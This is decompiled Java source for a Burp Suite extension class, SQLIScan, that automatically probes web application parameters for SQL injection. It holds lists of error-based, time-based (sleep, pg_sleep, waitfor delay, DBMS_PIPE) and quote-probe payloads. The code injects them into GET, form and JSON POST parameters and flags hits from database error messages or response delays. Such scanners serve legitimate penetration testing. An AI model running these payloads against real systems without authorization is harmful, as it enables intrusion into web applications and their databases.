/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.Common;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.utils.Config;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SQLIScan {
    public static String[] payloads_sqli_error_mysql = new String[]{"'and/**/extractvalue(1,concat(char(126),md5(1836161162)))and'", "\"and/**/extractvalue(1,concat(char(126),md5(1836161162)))and\"", "/**/and/**/extractvalue(1,concat(char(126),md5(1836161162)))"};
    public static String[] payloads_sqli_time = new String[]{" and sleep(5)", "'and sleep(5) and '1", "\"and sleep(5) and \"1", "/**/and(select*from(select+sleep(5)union/**/select+1)a)", "'and(select*from(select/**/sleep(5))a/**/union/**/select+1)='", "\"and(select*from(select/**/sleep(5))a/**/union/**/select+1)=\"", "/**/and(select/**/1/**/from/**/pg_sleep(5))>0/**/", "'/**/and(select'1'from/**/pg_sleep(5))::text>'0", "\"/**/and(select\"1\"from/**/pg_sleep(5))::text>\"0", "/**/and(select/**/1)>0/**/waitfor/**/delay'0:0:5'/**/", "'and(select/**/1)>0/**/waitfor/**/delay'0:0:5", "\"and(select/**/1)>0/**/waitfor/**/delay\"0:0:5", "/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE('q',5)", "'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',5)='h", "\"/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(\"h\",5)=\"h"};
    public static String[] payloads_sqli_echo = new String[]{"'", "\"", "\\"};

    public static IHttpRequestResponse ParamEchoScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) throws UnsupportedEncodingException {
        block31: {
            byte[] srcbody;
            String reqMethod;
            block32: {
                if (baseRequestResponse.getRequest() == null) break block31;
                reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
                String host = baseRequestResponse.getHttpService().getHost();
                if (!reqMethod.equalsIgnoreCase("get")) break block32;
                for (String poc : payloads_sqli_echo) {
                    List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    List<String> targertList = Common.ParamAddPocGetNoreplace(headers.get(0), poc);
                    for (String target : targertList) {
                        headers.set(0, target);
                        byte[] body = helpers.buildHttpMessage(headers, null);
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        String res = Common.getResbody(requestResponse.getResponse(), helpers);
                        if (res.contains("You have an error in your SQL syntax")) {
                            return requestResponse;
                        }
                        if (res.contains("System.Data.SqlClient.SqlException:")) {
                            return requestResponse;
                        }
                        if (res.contains("Microsoft OLE DB Provider for ODBC Drivers")) {
                            return requestResponse;
                        }
                        Matcher m_mssql = Pattern.compile("\\[Microsoft\\]\\[ODBC [a-zA-Z0-9 ]{17,24}\\]\\[SQL Server\\]").matcher(res);
                        if (m_mssql.find()) {
                            return requestResponse;
                        }
                        Matcher m_oracle = Pattern.compile("ORA-\\d{5}: ").matcher(res);
                        if (m_oracle.find()) {
                            return requestResponse;
                        }
                        if (!res.contains("pg_query(): Query failed:") && !res.contains("pg_fetch_row() expects")) continue;
                        return requestResponse;
                    }
                    try {
                        Thread.currentThread();
                        Thread.sleep(Integer.parseInt(Config.get("enabled_sleep_value")));
                    } catch (InterruptedException e) {
                        BurpExtender.stdout.println(e.getMessage());
                    }
                }
                break block31;
            }
            if (!reqMethod.equalsIgnoreCase("post")) break block31;
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            boolean json = false;
            boolean multipart = false;
            boolean x_www_form_urlencoded = false;
            for (String header : headers) {
                if (header.contains("Content-Type: json/application") || header.contains("Content-Type: application/json")) {
                    json = true;
                }
                if (header.contains("multipart/form-data")) {
                    multipart = true;
                }
                if (!header.contains("application/x-www-form-urlencoded")) continue;
                x_www_form_urlencoded = true;
            }
            if (x_www_form_urlencoded) {
                int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                srcbody = baseRequestResponse.getRequest();
                byte[] reqbody = Common.getpostParams(start, srcbody);
                String reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                for (String poc : payloads_sqli_echo) {
                    List<String> targertList = Common.ParamAddPocPostNoreplace(reqbodystr, poc);
                    for (String target : targertList) {
                        byte[] body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        String res = Common.getResbody(requestResponse.getResponse(), helpers);
                        if (res.contains("You have an error in your SQL syntax")) {
                            return requestResponse;
                        }
                        if (res.contains("System.Data.SqlClient.SqlException:")) {
                            return requestResponse;
                        }
                        if (res.contains("Microsoft OLE DB Provider for ODBC Drivers")) {
                            return requestResponse;
                        }
                        Matcher m_mssql = Pattern.compile("\\[Microsoft\\]\\[ODBC [a-zA-Z0-9 ]{17,24}\\]\\[SQL Server\\]").matcher(res);
                        if (m_mssql.find()) {
                            return requestResponse;
                        }
                        Matcher m_oracle = Pattern.compile("ORA-\\d{5}: ").matcher(res);
                        if (m_oracle.find()) {
                            return requestResponse;
                        }
                        if (!res.contains("pg_query(): Query failed:") && !res.contains("pg_fetch_row() expects")) continue;
                        return requestResponse;
                    }
                }
            } else if (json) {
                int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                srcbody = baseRequestResponse.getRequest();
                byte[] reqbody = Common.getpostParams(start, srcbody);
                String reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                for (String poc : payloads_sqli_echo) {
                    List<String> tragetList = Common.ParamAddPocPostJsonNoreplace(reqbodystr, poc);
                    for (String target : tragetList) {
                        byte[] body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        String res = Common.getResbody(requestResponse.getResponse(), helpers);
                        if (res.contains("You have an error in your SQL syntax")) {
                            return requestResponse;
                        }
                        if (res.contains("System.Data.SqlClient.SqlException:")) {
                            return requestResponse;
                        }
                        if (res.contains("Microsoft OLE DB Provider for ODBC Drivers")) {
                            return requestResponse;
                        }
                        Matcher m_mssql = Pattern.compile("\\[Microsoft\\]\\[ODBC [a-zA-Z0-9 ]{17,24}\\]\\[SQL Server\\]").matcher(res);
                        if (m_mssql.find()) {
                            return requestResponse;
                        }
                        Matcher m_oracle = Pattern.compile("ORA-\\d{5}: ").matcher(res);
                        if (m_oracle.find()) {
                            return requestResponse;
                        }
                        if (!res.contains("pg_query(): Query failed:") && !res.contains("pg_fetch_row() expects")) continue;
                        return requestResponse;
                    }
                }
            }
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(Config.get("enabled_sleep_value")));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
        }
        return null;
    }

    public static IHttpRequestResponse ParamErrorScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) throws UnsupportedEncodingException {
        if (baseRequestResponse.getRequest() != null) {
            List<String> headers;
            String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
            String host = baseRequestResponse.getHttpService().getHost();
            if (reqMethod.equalsIgnoreCase("get")) {
                for (String poc : payloads_sqli_error_mysql) {
                    headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    List<String> targertList = Common.ParamAddPocGetNoreplace(headers.get(0), poc);
                    for (String target : targertList) {
                        headers.set(0, target);
                        byte[] body = helpers.buildHttpMessage(headers, null);
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        String res = Common.getResbody(requestResponse.getResponse(), helpers);
                        if (!res.contains("XPATH syntax error")) continue;
                        return requestResponse;
                    }
                    try {
                        Thread.currentThread();
                        Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                    } catch (InterruptedException e) {
                        BurpExtender.stdout.println(e.getMessage());
                    }
                }
            }
            if (reqMethod.equalsIgnoreCase("post")) {
                String res;
                IHttpRequestResponse requestResponse;
                byte[] body;
                String reqbodystr;
                byte[] reqbody;
                byte[] srcbody;
                headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                boolean json = false;
                boolean multipart = true;
                for (String header : headers) {
                    if (header.contains("Content-Type: json/application") || header.contains("Content-Type: application/json")) {
                        json = true;
                    }
                    if (!header.contains("multipart/form-data")) continue;
                    multipart = false;
                }
                if (!json && multipart) {
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    srcbody = baseRequestResponse.getRequest();
                    reqbody = Common.getpostParams(start, srcbody);
                    reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                    for (String poc : payloads_sqli_error_mysql) {
                        List<String> targertList = Common.ParamAddPocPostNoreplace(reqbodystr, poc);
                        for (String target : targertList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            res = Common.getResbody(requestResponse.getResponse(), helpers);
                            if (!res.contains("XPATH syntax error")) continue;
                            return requestResponse;
                        }
                    }
                }
                if (json && multipart) {
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    srcbody = baseRequestResponse.getRequest();
                    reqbody = Common.getpostParams(start, srcbody);
                    reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                    for (String poc : payloads_sqli_error_mysql) {
                        List<String> tragetList = Common.ParamAddPocPostJsonNoreplace(reqbodystr, poc);
                        for (String target : tragetList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            res = Common.getResbody(requestResponse.getResponse(), helpers);
                            if (!res.contains("XPATH syntax error")) continue;
                            return requestResponse;
                        }
                    }
                }
                try {
                    Thread.currentThread();
                    Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                } catch (InterruptedException e) {
                    BurpExtender.stdout.println(e.getMessage());
                }
            }
        }
        return null;
    }

    public static IHttpRequestResponse ParamTimeScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) throws UnsupportedEncodingException {
        if (baseRequestResponse.getRequest() != null) {
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
            String host = baseRequestResponse.getHttpService().getHost();
            if (reqMethod.equalsIgnoreCase("get")) {
                long org_start = System.currentTimeMillis();
                callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpMessage(headers, null));
                long org_end = System.currentTimeMillis();
                long orgreq_time = org_end - org_start;
                for (String poc : payloads_sqli_time) {
                    headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    List<String> targertList = Common.ParamAddPocGetNoreplace(headers.get(0), poc);
                    for (String target : targertList) {
                        headers.set(0, target);
                        byte[] body = helpers.buildHttpMessage(headers, null);
                        long start_get = System.currentTimeMillis();
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        long end_get = System.currentTimeMillis();
                        if (!(end_get - start_get - orgreq_time >= 4700L && end_get - start_get - orgreq_time <= 5300L || end_get - start_get - orgreq_time >= 9700L && end_get - start_get - orgreq_time <= 10300L || end_get - start_get - orgreq_time >= 14700L && end_get - start_get - orgreq_time <= 15300L) && (end_get - start_get - orgreq_time < 19700L || end_get - start_get - orgreq_time > 20300L)) continue;
                        return requestResponse;
                    }
                    try {
                        Thread.currentThread();
                        Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                    } catch (InterruptedException e) {
                        BurpExtender.stdout.println(e.getMessage());
                    }
                }
            }
            if (reqMethod.equalsIgnoreCase("post")) {
                long end_post;
                IHttpRequestResponse requestResponse;
                long start_post;
                byte[] body;
                headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                boolean json = false;
                boolean multipart = true;
                for (String header : headers) {
                    if (header.contains("Content-Type: json/application") || header.contains("Content-Type: application/json")) {
                        json = true;
                    }
                    if (!header.contains("multipart/form-data")) continue;
                    multipart = false;
                }
                int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                byte[] srcbody = baseRequestResponse.getRequest();
                byte[] reqbody = Common.getpostParams(start, srcbody);
                String reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                long org_start = System.currentTimeMillis();
                callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpMessage(headers, Common.getpostParams(start, srcbody)));
                long org_end = System.currentTimeMillis();
                long orgreq_time = org_end - org_start;
                if (!json && multipart) {
                    for (String poc : payloads_sqli_time) {
                        List<String> targertList = Common.ParamAddPocPostNoreplace(reqbodystr, poc);
                        for (String target : targertList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            start_post = System.currentTimeMillis();
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            end_post = System.currentTimeMillis();
                            if (!(end_post - start_post - orgreq_time >= 4700L && end_post - start_post - orgreq_time <= 5300L || end_post - start_post - orgreq_time >= 9700L && end_post - start_post - orgreq_time <= 10300L || end_post - start_post - orgreq_time >= 14700L && end_post - start_post - orgreq_time <= 15300L) && (end_post - start_post - orgreq_time < 19700L || end_post - start_post - orgreq_time > 20300L)) continue;
                            return requestResponse;
                        }
                        try {
                            Thread.currentThread();
                            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                        } catch (InterruptedException e) {
                            BurpExtender.stdout.println(e.getMessage());
                        }
                    }
                }
                if (json && multipart) {
                    for (String poc : payloads_sqli_time) {
                        List<String> tragetList = Common.ParamAddPocPostJsonNoreplace(reqbodystr, poc);
                        for (String target : tragetList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            start_post = System.currentTimeMillis();
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            end_post = System.currentTimeMillis();
                            if (!(end_post - start_post - orgreq_time >= 4700L && end_post - start_post - orgreq_time <= 5300L || end_post - start_post - orgreq_time >= 9700L && end_post - start_post - orgreq_time <= 10300L || end_post - start_post - orgreq_time >= 14700L && end_post - start_post - orgreq_time <= 15300L) && (end_post - start_post - orgreq_time < 19700L || end_post - start_post - orgreq_time > 20300L)) continue;
                            return requestResponse;
                        }
                        try {
                            Thread.currentThread();
                            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                        } catch (InterruptedException e) {
                            BurpExtender.stdout.println(e.getMessage());
                        }
                    }
                }
            }
        }
        return null;
    }
}

